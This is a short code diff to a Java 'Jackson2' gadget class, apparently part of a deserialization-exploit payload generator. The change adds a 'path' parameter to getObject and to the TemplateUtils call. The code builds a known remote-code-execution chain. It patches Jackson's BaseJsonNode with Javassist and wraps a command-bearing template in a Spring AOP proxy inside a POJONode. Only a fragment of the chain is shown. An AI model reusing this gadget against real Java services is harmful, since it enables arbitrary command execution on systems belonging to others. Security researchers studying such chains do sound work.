@@ -12,7 +12,7 @@ import java.lang.reflect.*;
 
 public class Jackson2 implements Gadget {
     @Override
-    public Object getObject(String command) throws Exception {
+    public Object getObject(String command,String path) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
         CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
@@ -23,7 +23,7 @@ public class Jackson2 implements Gadget {
         Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
         cons.setAccessible(true);
         AdvisedSupport advisedSupport = new AdvisedSupport();
-        advisedSupport.setTarget(TemplateUtils.getTemplate(command));
+        advisedSupport.setTarget(TemplateUtils.getTemplate(command,path));
         InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
         Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
         POJONode jsonNodes = new POJONode(proxyObj);
